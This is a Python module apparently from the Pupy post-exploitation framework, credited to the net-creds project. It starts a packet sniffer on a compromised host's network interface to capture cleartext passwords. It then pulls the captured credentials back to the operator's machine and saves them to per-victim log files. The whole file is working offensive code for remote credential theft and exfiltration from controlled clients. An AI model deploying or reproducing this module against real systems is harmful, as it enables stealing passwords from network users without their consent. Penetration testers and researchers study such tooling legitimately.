# -*- coding: utf-8 -*-
# Thanks to Dan McInerney for its net-creds project
# Github: https://github.com/DanMcInerney/net-creds
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import obtain
import os
import datetime

__class_name__="NetCreds"

@config(cat="gather", compat=["linux", "windows"])
class NetCreds(PupyModule):
    """
        Sniffs cleartext passwords from interface
    """
    unique_instance = True
    dependencies=[ 'netifaces', 'scapy', 'gzip', 'BaseHTTPServer', 'pupyutils.netcreds' ]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='netcreds', description=cls.__doc__)
        cls.arg_parser.add_argument("-i", metavar="INTERFACE", dest='interface', default=None, help="Choose an interface (optional)")
        cls.arg_parser.add_argument("-f", metavar="IP", dest='filterip', default=None, help="Do not sniff packets from this IP address; -f 192.168.0.4")
        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def run(self, args):
        if args.action=="start":
            r = self.client.conn.modules["pupyutils.netcreds"].netcreds_start(args.interface, args.filterip)
            if r == 'not_root':
                self.error("Needs root privileges to be started")
            elif not r:
                self.error("Network credentials sniffer is already started")
            else:
                self.success("Network credentials sniffer started !")

        elif args.action=="dump":
            try:
                os.makedirs(os.path.join("data","netcreds"))
            except Exception:
                pass

            data = obtain(self.client.conn.modules["pupyutils.netcreds"].netcreds_dump())

            if data is None:
                self.error("Network credentials sniffer has not been started yet")

            elif not data:
                self.warning("No network credentials recorded")

            else:
                data = '\n'.join(data)
                data += '\n'

                # remove color before writting into the file
                W = '\033[0m'  # white (normal)
                T = '\033[93m'  # tan
                data_no_color=data.replace(W, '').replace(T, '')
                filepath=os.path.join("data", "netcreds","creds_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".log")
                self.success("Dumping recorded netcreds in %s"%filepath)
                with open(filepath, 'w') as f:
                    f.write(data_no_color)

                self.log(data)

        elif args.action=="stop":
            stop = self.client.conn.modules["pupyutils.netcreds"].netcreds_stop()
            self.success("Network credentials sniffer is stopped")
